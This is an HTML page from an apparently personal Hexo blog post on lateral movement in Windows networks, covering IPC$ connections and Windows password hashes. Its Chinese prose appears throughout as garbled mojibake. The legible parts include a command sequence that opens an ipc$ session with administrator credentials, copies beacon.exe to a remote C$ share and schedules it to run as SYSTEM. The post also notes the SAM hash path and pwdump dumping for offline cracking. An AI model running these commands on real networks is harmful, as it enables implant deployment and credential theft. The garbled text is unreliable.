

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="Ê®™ÂêëÁßªÂä®IPCIPC(Inter Process Connection)ÂÖ±‰∫´ÂëΩÂêçÁÆ°ÈÅìÁöÑËµÑÊ∫êÔºåÊòØ‰∏∫‰∫ÜÂÆûÁé∞ËøõÁ®ãÈó¥ÈÄö‰ø°ËÄåÂºÄÊîæÁöÑÂëΩÂêçÁÆ°ÈÅì„ÄÇIPCÂèØ‰ª•ÈÄöËøáÈ™åËØÅÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅËé∑ÂèñÁõ∏Â∫îÊùÉÈôêÔºåÈÄöÂ∏∏Âú®ËøúÁ®ãÁÆ°ÁêÜËÆ°ÁÆóÊú∫ÂíåÊü•ÁúãËÆ°ÁÆóÊú∫ÁöÑÂÖ±‰∫´ËµÑÊ∫êÊó∂‰ΩøÁî® ÈÄöËøáipc$ÂèØ‰ª•‰∏éÁõÆÊ†áÊú∫Âô®Âª∫Á´ãËøûÊé•„ÄÇÂà©Áî®Ëøô‰∏™ËøûÊé•Ôºå‰∏ç‰ªÖÂèØ‰ª•ËÆøÈóÆÁõÆÊ†áÊú∫Âô®Âè™ËÉΩÂ§üÁöÑÊñá‰ª∂ÔºåËøõË°å‰∏ä‰º†„ÄÅ‰∏ãËΩΩÁ≠âÊìç‰ΩúÔºåËøòÂèØ‰ª•Âú®ÁõÆÊ†áÊú∫Âô®‰∏äËøêË°åÂÖ∂‰ªñÂëΩ‰ª§Ôºå‰ª•Ëé∑ÂèñÁõÆÊ†áÊú∫Âô®ÁöÑÁõÆÂΩïÁªìÊûÑ„ÄÅÁî®Êà∑ÂàóË°®Á≠â‰ø°">
<meta property="og:type" content="article">
<meta property="og:title" content="Ê®™ÂêëÁßªÂä®">
<meta property="og:url" content="http://example.com/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
<meta property="og:site_name" content="üóÑ">
<meta property="og:description" content="Ê®™ÂêëÁßªÂä®IPCIPC(Inter Process Connection)ÂÖ±‰∫´ÂëΩÂêçÁÆ°ÈÅìÁöÑËµÑÊ∫êÔºåÊòØ‰∏∫‰∫ÜÂÆûÁé∞ËøõÁ®ãÈó¥ÈÄö‰ø°ËÄåÂºÄÊîæÁöÑÂëΩÂêçÁÆ°ÈÅì„ÄÇIPCÂèØ‰ª•ÈÄöËøáÈ™åËØÅÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅËé∑ÂèñÁõ∏Â∫îÊùÉÈôêÔºåÈÄöÂ∏∏Âú®ËøúÁ®ãÁÆ°ÁêÜËÆ°ÁÆóÊú∫ÂíåÊü•ÁúãËÆ°ÁÆóÊú∫ÁöÑÂÖ±‰∫´ËµÑÊ∫êÊó∂‰ΩøÁî® ÈÄöËøáipc$ÂèØ‰ª•‰∏éÁõÆÊ†áÊú∫Âô®Âª∫Á´ãËøûÊé•„ÄÇÂà©Áî®Ëøô‰∏™ËøûÊé•Ôºå‰∏ç‰ªÖÂèØ‰ª•ËÆøÈóÆÁõÆÊ†áÊú∫Âô®Âè™ËÉΩÂ§üÁöÑÊñá‰ª∂ÔºåËøõË°å‰∏ä‰º†„ÄÅ‰∏ãËΩΩÁ≠âÊìç‰ΩúÔºåËøòÂèØ‰ª•Âú®ÁõÆÊ†áÊú∫Âô®‰∏äËøêË°åÂÖ∂‰ªñÂëΩ‰ª§Ôºå‰ª•Ëé∑ÂèñÁõÆÊ†áÊú∫Âô®ÁöÑÁõÆÂΩïÁªìÊûÑ„ÄÅÁî®Êà∑ÂàóË°®Á≠â‰ø°">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png">
<meta property="article:published_time" content="2022-03-31T04:51:36.018Z">
<meta property="article:modified_time" content="2022-04-11T03:07:59.854Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="knowledge">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png">
  
  <title>Ê®™ÂêëÁßªÂä® - üóÑ</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- Ëá™ÂÆö‰πâÊ†∑Âºè‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>üë©‚Äçüíª</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Ê®™ÂêëÁßªÂä®">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-03-31 12:51" pubdate>
        March 31, 2022 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      16k Â≠ó
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN ÂàÜÈíü
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Ê®™ÂêëÁßªÂä®</h1>
            
            <div class="markdown-body">
              <h1 id="Ê®™ÂêëÁßªÂä®"><a href="#Ê®™ÂêëÁßªÂä®" class="headerlink" title="Ê®™ÂêëÁßªÂä®"></a>Ê®™ÂêëÁßªÂä®</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC(Inter Process Connection)ÂÖ±‰∫´<code>ÂëΩÂêçÁÆ°ÈÅì</code>ÁöÑËµÑÊ∫êÔºåÊòØ‰∏∫‰∫ÜÂÆûÁé∞ËøõÁ®ãÈó¥ÈÄö‰ø°ËÄåÂºÄÊîæÁöÑÂëΩÂêçÁÆ°ÈÅì„ÄÇ<code>IPC</code>ÂèØ‰ª•ÈÄöËøáÈ™åËØÅÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅËé∑ÂèñÁõ∏Â∫îÊùÉÈôêÔºåÈÄöÂ∏∏Âú®ËøúÁ®ãÁÆ°ÁêÜËÆ°ÁÆóÊú∫ÂíåÊü•ÁúãËÆ°ÁÆóÊú∫ÁöÑÂÖ±‰∫´ËµÑÊ∫êÊó∂‰ΩøÁî®</p>
<p>ÈÄöËøá<code>ipc$</code>ÂèØ‰ª•‰∏éÁõÆÊ†áÊú∫Âô®Âª∫Á´ãËøûÊé•„ÄÇÂà©Áî®Ëøô‰∏™ËøûÊé•Ôºå‰∏ç‰ªÖÂèØ‰ª•ËÆøÈóÆÁõÆÊ†áÊú∫Âô®Âè™ËÉΩÂ§üÁöÑÊñá‰ª∂ÔºåËøõË°å‰∏ä‰º†„ÄÅ‰∏ãËΩΩÁ≠âÊìç‰ΩúÔºåËøòÂèØ‰ª•Âú®ÁõÆÊ†áÊú∫Âô®‰∏äËøêË°åÂÖ∂‰ªñÂëΩ‰ª§Ôºå‰ª•Ëé∑ÂèñÁõÆÊ†áÊú∫Âô®ÁöÑÁõÆÂΩïÁªìÊûÑ„ÄÅÁî®Êà∑ÂàóË°®Á≠â‰ø°ÊÅØ</p>
<p>Âª∫Á´ã‰∏Ä‰∏™<code>ipc$</code>Âπ∂Êü•ÁúãÂΩìÂâçËøûÊé•ËæìÂÖ•Â¶Ç‰∏ãÂëΩ‰ª§</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\ip\ipc$ &quot;password&quot; /user:administrator<br><span class="hljs-built_in">net</span> use<br></code></pre></td></tr></table></figure>

<p><strong>Âà©Áî®Êù°‰ª∂Ôºö</strong>ÂºÄÂêØ139(NetBIOS)„ÄÅ445Á´ØÂè£ÔºåÁÆ°ÁêÜÂëòÂºÄÂêØ‰∫ÜÈªòËÆ§ÂÖ±‰∫´Ôºå‰∏ÄËà¨ÈªòËÆ§ÂºÄÂêØÔºåÂØπÂ∫îÁöÑÈÄªËæëÁõò‰πüÂèØ‰ª•ËÆøÈóÆÂà∞</p>
<p><strong>Êä•ÈîôÔºö</strong></p>
<ul>
<li>ÈîôËØØÂè∑5:ÊãíÁªùËÆøÈóÆ</li>
<li>ÈîôËØØÂè∑51:windowsÊó†Ê≥ïÊâæÂà∞ÁΩëÁªúË∑ØÂæÑÔºåÂç≥ÁΩëÁªú‰∏≠Â≠òÂú®ÈóÆÈ¢ò</li>
<li>ÈîôËØØÂè∑53:Êâæ‰∏çÂà∞ÁΩëÁªúË∑ØÂæÑÔºåÂåÖÊã¨IPÂú∞ÂùÄÈîôËØØ„ÄÅÁõÆÊ†áÊú™ÂºÄÊú∫„ÄÅÁõÆÊ†álanmanserverÊúçÂä°Êú™ÂêØÂä®„ÄÅÁõÆÊ†áÊúâÈò≤ÁÅ´Â¢ôÔºàÁ´ØÂè£ËøáÊª§Ôºâ</li>
<li>ÈîôËØØÂè∑67:Êâæ‰∏çÂà∞ÁΩëÁªúÂêçÔºåÂåÖÊã¨lanmanworkstationÊúçÂä°Êú™ÂêØÂä®„ÄÅipc$Â∑≤Ë¢´Âà†Èô§</li>
<li>ÈîôËØØÂè∑1219:Êèê‰æõÁöÑÂá≠ÊçÆ‰∏éÂ∑≤Â≠òÂú®ÁöÑÂá≠ÊçÆÈõÜÂÜ≤Á™Å„ÄÇ‰æãÂ¶ÇÔºåÂ∑≤ÁªèÂíåÁõÆÊ†áÂª∫Á´ã‰∫Üipc$,ÈúÄË¶ÅÂú®Âà†Èô§ÂéüËøûÊé•ÂêéÈáçÊñ∞ËøõË°åËøûÊé•</li>
<li>ÈîôËØØÂè∑1326:Êú™Áü•ÁöÑÁî®Êà∑ÂêçÊàñÂØÜÁ†ÅÈîôËØØ</li>
<li>ÈîôËØØÂè∑1792:ËØïÂõæÁôªÂΩïÔºå‰ΩÜÊòØÁΩëÁªúÁôªÂΩïÊúçÂä°Ê≤°ÊúâÂêØÂä®ÔºåÂåÖÊã¨ÁõÆÊ†áNetLoginÊúçÂä°Êú™ÂêØÂä®ÔºàËøûÊé•ÂüüÊéßÂà∂Âô®Êó∂‰ºöÂá∫Áé∞Ê≠§ÊÉÖÂÜµÔºâ</li>
<li>ÈîôËØØÂè∑2242:Ê≠§Áî®Êà∑ÁöÑÂØÜÁ†ÅÂ∑≤ÁªèËøáÊúü„ÄÇ‰æãÂ¶ÇÔºåÁõÆÊ†áÊú∫Âô®ËÆæÁΩÆ‰∫ÜË¥¶Âè∑ÁÆ°ÁêÜÁ≠ñÁï•ÔºåÂº∫Âà∂Áî®Êà∑ÂÆöÊúü‰øÆÊîπÂØÜÁ†Å</li>
</ul>
<p>IPCÂª∫Á´ãÂêé</p>
<blockquote>
<p>dir \\ip\C$</p>
<p>tasklist /S ip /U administrator /P 123456</p>
<p>net time \\ip</p>
<p>copy beacon.exe \\ip\C$</p>
<p>at \\ip  19:00:00 C:\beacon.exe</p>
<p>at \\ip /delete</p>
<p>//Windows Vista„ÄÅwindows server2008Âèä‰πãÂêéÁâàÊú¨ÁöÑÊìç‰ΩúÁ≥ªÁªüÂ∑≤Â∞ÜatÂëΩ‰ª§Â∫üÂºÉ‰∫Ü</p>
<p>schtasks /create /s ip /tn test /sc onstart c:\beacon.exe /ru system /f</p>
<p>schtasks /run /s ip /i /tn ‚Äútest‚Äù</p>
<p>schtasks /delete /s ip  /tn ‚Äútest‚Äù /f</p>
<p>net use \\ip  /del /y</p>
</blockquote>
<h2 id="Windows-hash"><a href="#Windows-hash" class="headerlink" title="Windows hash"></a>Windows hash</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8117#toc-16">https://xz.aliyun.com/t/8117#toc-16</a></p>
<p>WindowsËÆ§ËØÅÂçèËÆÆÊúâ‰∏§ÁßçNTLMÔºàNT LAN ManagerÔºâÂíåKerberosÔºåÂâçËÄÖ‰∏ªË¶ÅÂ∫îÁî®‰∫éÁî®‰∫éWindows NT Âíå Windows 2000 ServerÔºàor  LaterÔºâ Â∑•‰ΩúÁªÑÁéØÂ¢ÉÔºåËÄåÂêéËÄÖÂàô‰∏ªË¶ÅÂ∫îÁî®‰∫éWindows 2000 ServerÔºàor LaterÔºâ ÂüüÔºàDomainÔºâÁéØÂ¢É</p>
<h3 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash&amp;NTLM Hash"></a>LM Hash&amp;NTLM Hash</h3><p>windowsÊìç‰ΩúÁ≥ªÁªüÂØÜÁ†Å‰∏ÄËà¨Áî±‰∏§ÈÉ®ÂàÜÁªÑÊàêÔºå‰∏ÄÈÉ®ÂàÜ‰∏∫<code>LM Hash</code>Âè¶‰∏ÄÈÉ®ÂàÜ‰∏∫<code>NTLM Hash</code>Âú®Windows‰∏≠ÔºåHashÁöÑÁªìÊûÑÈÄöÂ∏∏Â¶Ç‰∏ã</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure>

<p><strong>LM Hash</strong>ÂÖ®Âêç‰∏∫<code>LAN Manager Hash</code>ÊòØÂæÆËΩØ‰∏∫‰∫ÜÊèêÈ´òwindowsÊìç‰ΩúÁ≥ªÁªüÁöÑÂÆâÂÖ®ÊÄßËÉΩËÄåÈááÁî®ÁöÑÊï£ÂàóÂä†ÂØÜÁÆóÊ≥ïÔºåÂÖ∂<strong>Êú¨Ë¥®ÊòØDESÂä†ÂØÜÔºåÂØÜÁ†Å‰∏çË∂≥14Â≠óËäÇÂ∞ÜÁî®0Ë°•ÂÖ®</strong>„ÄÇLM HashËæÉÂÆπÊòìÁ†¥Ëß£Ôºå‰ΩÜÂæÆËΩØ‰ªÖ‰ªÖÊòØÂ∞ÜLM HashÁ¶ÅÁî®‰∫Ü<code>‰ªéwindows VistaÂíåwindows server 2008ÁâàÊú¨ÂºÄÂßãÔºåWindowsÊìç‰ΩúÁ≥ªÁªüÈªòËÆ§Á¶ÅÁî®LM Hash</code>„ÄÇLM HashÊòéÊñáÂØÜÁ†ÅÈôêÂÆöÂú®14‰Ωç‰ª•ÂÜÖÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÂ¶ÇÊûúË¶ÅÂÅúÊ≠¢‰ΩøÁî®LM Hash Â∞ÜÁî®Êà∑ÂØÜÁ†ÅËÆæÁΩÆ‰∏∫14‰Ωç‰ª•‰∏äÂç≥ÂèØ„ÄÇÂ¶ÇÊûúÊäìÂèñÁöÑLM HashÈÄöÂ∏∏‰∏∫<strong>AAD3B435B51404EEAAD3B435B51404EE</strong>Ë°®Á§∫<strong>ÂØÜÁ†Å‰∏∫Á©∫Êàñ<code>LM Hash</code>Ë¢´Á¶ÅÁî®</strong></p>
<p><strong>NTLM Hash</strong>ÊòØÂæÆËΩØ‰∏∫‰∫ÜÊèêÈ´òÂÆâÂÖ®ÊÄßÁöÑÂêåÊó∂ÂÖºÂÆπËÄåËÆæËÆ°ÁöÑÊï£ÂàóÂä†ÂØÜÁÆóÊ≥ï„ÄÇNTLM Hash ÊòØ<strong>Âü∫‰∫éMD4Âä†ÂØÜÁÆóÊ≥ï</strong>ËøõË°åÂä†ÂØÜÁöÑ„ÄÇ‰∏™‰∫∫Áâà‰ªéWindows vista ÊúçÂä°Âô®Áâà‰ªéwindows server2003‰ª•ÂêéÔºåwindowsÊìç‰ΩúÁ≥ªÁªüÁöÑËÆ§ËØÅÊñπÂºèÂùá‰∏∫NTLM Hash</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>Net-NTLM Hash</strong></p>
<p>Â≠òÂú®‰∏§‰∏™ÁâàÊú¨</p>
<p><strong>Net-NTLMv1:window2003Âíåwindow xp‰πãÂâçÈªòËÆ§ÂêØÁî®</strong></p>
<p>Net-ntlm hash v1ÁöÑÊ†ºÂºè‰∏∫username::hostname:LM response:NTLM response:challenge</p>
<p>Áî±‰∫év1ÁâàÊú¨ÁöÑÂä†ÂØÜÊñπÂºèÊØîËæÉËÑÜÂº±ÔºåÂæàÂÆπÊòìËß£ÂØÜÂæóÂà∞NTLM Hash,Âü∫Êú¨Âú®ÂèØÊéßÊó∂Èó¥ÂÜÖËÉΩËß£Âá∫„ÄÇ</p>
<p><strong>Net-NTLMv2:window2008 Âíå window Vist‰πãÂêéÈªòËÆ§ÂêØÁî®</strong></p>
<p>Net-ntlm hash v2ÁöÑÊ†ºÂºè‰∏∫username::domain:challenge:HMAC-MD5:blob</p>
<p>v2ÁâàÊú¨,Âä†ÂØÜÊñπÂºèÊØîËæÉÂº∫Ôºå‰ΩÜÊòØÂèØ‰ª•ËøõË°åÊòéÊñáÁàÜÁ†¥ÔºåÂà©Áî®ÈöæÂ∫¶ÊØîËæÉÂ§ß„ÄÇ</p>
<p>NTLM‰ΩøÁî®Âú®Windows NTÂíåWindows 2000 ServerÔºàor  laterÔºâÂ∑•‰ΩúÁªÑÁéØÂ¢É‰∏≠ÔºàKerberosÁî®Âú®ÂüüÊ®°Âºè‰∏ãÔºâÔºõÂú®ADÂüüÁéØÂ¢É‰∏≠ÔºåÂ¶ÇÊûúÈúÄË¶ÅËÆ§ËØÅWindows  NTÁ≥ªÁªüÔºå‰πüÂøÖÈ°ªÈááÁî®NTLM„ÄÇNTLM‰∏ªË¶ÅÊòØ‰∏ÄÁßç<strong>Âü∫‰∫éÊåëÊàòÔºàchallengeÔºâ/ÂìçÂ∫îÔºàresponseÔºâÊ∂àÊÅØ‰∫§‰∫íÊ®°ÂºèÁöÑËÆ§ËØÅËøáÁ®ã</strong>Ôºö</p>
<p>  1„ÄÅÁî®Êà∑ÁôªÂΩïÊó∂ËæìÂÖ•ÁöÑuser name„ÄÅpasswordÂíådomain nameÔºåÁÑ∂ÂêéClientÁ´ØËÆ°ÁÆópasswordÁöÑhashÂÄºÂπ∂‰øùÂ≠òÂú®Êú¨Âú∞Ôºõ</p>
<p>  2„ÄÅÂÆ¢Êà∑Á´ØÂ∞Üuser nameÁöÑÊòéÊñáÂèëÈÄÅÁªôDCÔºõ</p>
<p>  3„ÄÅDCÁîüÊàê‰∏Ä‰∏™16-byteÁöÑÈöèÊú∫Êï∞ÔºåÂè´ÂÅöchallengeÔºå‰º†ËæìÁªôclientÔºõ</p>
<p>  4„ÄÅclientÊî∂Âà∞challenge‰ª•ÂêéÔºåÂú®Â§çÂà∂‰∏Ä‰ªΩÊã∑Ë¥ùÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂‰∏≠‰∏Ä‰∏™challengeÁî®password hashÂä†ÂØÜÔºåËøô‰∏™Âè´ÂÅöresponseÔºåÁÑ∂ÂêéÂ∞ÜchallengeÔºåresponse‰ª•Âèäuser name‰º†ÈÄÅÁªôserverÔºõ</p>
<p>  5„ÄÅserverÁ´ØÂú®Êî∂Âà∞client‰º†ÈÄÅËøáÊù•ÁöÑ‰∏â‰ªΩÂÜÖÂÆπ‰ª•ÂêéÂ∞ÜÂÆÉ‰ª¨ËΩ¨ÂèëÁªôDCÔºõ</p>
<p>  6„ÄÅDCÂú®Êî∂Âà∞user nameÔºåresponseÔºåchallenge‰ª•ÂêéÔºåÊ†πÊçÆuser nameÂú®account database‰∏≠ÊâæÂà∞ÂÖ∂ÂØπÂ∫îÁöÑpassword hashÔºåÁÑ∂ÂêéÁî®Ëøô‰∏™password hashÂä†ÂØÜchallengeÔºõ</p>
<p>  7„ÄÅDCÂ∞ÜresponseË∑üÂä†ÂØÜÂêéÁöÑchallengeËøõË°åÊØîËæÉÔºåÂ¶ÇÊûúÁõ∏ÂêåÂàôNTLMÈ™åËØÅÊàêÂäü„ÄÇDCÂ∞ÜÈ™åËØÅÁªìÊûúÂèëÁªôServerÔºåÂπ∂ÊúÄÁªàËøîÂõûÁªôClient„ÄÇ</p>
<p>  Â¶ÇÊûúÊòØ‰ΩøÁî®Êú¨Âú∞Áî®Êà∑Ë∫´‰ªΩËøõË°åËÆ§ËØÅÔºåÂàôÊúâServerÊú¨Ë∫´ÂÆåÊàêËÆ§ËØÅËøáÁ®ã„ÄÇ</p>
<p><strong>hashÂÇ®Â≠òÔºöSAMÊñá‰ª∂(local)„ÄÅNTDS.DITÊñá‰ª∂(domain)</strong></p>
<blockquote>
<p>SAM(Security Account Manager) ÂÆâÂÖ®Ë¥¶Êà∑ÁÆ°ÁêÜÂô®ÊòØ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìÊñá‰ª∂ÔºåÂú®Windows  XPÔºåWindows Vista,windows7-10Áî®‰∫éÂ≠òÂÇ®Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ‰ªñÂèØ‰ª•Áî®Êù•È™åËØÅÊú¨Âú∞ÂíåËøúÁ®ãÁî®Êà∑„ÄÇÂú®windows 2000 sp4  ÂºÄÂßã,Active Dircetory ÂØπËøúÁ®ãÁî®Êà∑ËøõË°åË∫´‰ªΩÈ™åËØÅ„ÄÇSAM‰ΩøÁî®Âä†ÂØÜÊé™ÊñΩÊù•Èò≤Ê≠¢Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑÁî®Êà∑ËÆøÈóÆÁ≥ªÁªü„ÄÇ</p>
<p>Áî®Êà∑ÂØÜÁ†Å‰ª•ÂìàÂ∏åÊ†ºÂºèÂ≠òÂÇ®Âú® Ê≥®ÂÜåË°®ÈÖçÁΩÆÂçïÂÖÉ‰∏≠(registry hive), ‰Ωú‰∏∫LM Hash or NTLM Hash.</p>
<p>Ëøô‰∏™Êñá‰ª∂ÂèØ‰ª•Âú®<code>%SystemRoot%/system32/config/SAM</code> Âíå ÊåÇËΩΩÂú®<code>HKLM/SAM</code></p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png" srcset="/img/loading.gif" lazyload></a></p>
<p>WIndowsËøêË°åÊó∂Êó†Ê≥ïÁßªÂä®ÊàñËÄÖÂ§çÂà∂SAMÊñá‰ª∂ÔºåÂõ†‰∏∫Windows ÂÜÖÊ†∏Ëé∑ÂèñÂπ∂Âú®SAMÊñá‰ª∂‰∏ä‰øùÁïô‰∫ÜÁã¨Âç†ÁöÑÊñá‰ª∂Á≥ªÁªüÈîÅÔºåÂπ∂‰∏îÂú®Êìç‰ΩúÁ≥ªÁªüÂÖ≥Èó≠‰πãÂâç‰∏ç‰ºöÈáäÊîæËØ•ÈîÅÔºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂ§öÁßçÊäÄÊúØÊØîÂ¶ÇpwdumpÊù•ËΩ¨ÂÇ®SAMÂÜÖÂÆπÁöÑÂÜÖÂ≠ò‰∏≠ÂâØÊú¨Ôºå‰ªéËÄå‰ΩøÂØÜÁ†ÅÂìàÂ∏åÂèØÁî®‰∫éÁ¶ªÁ∫øÊö¥ÂäõÊîªÂáª„ÄÇ</p>
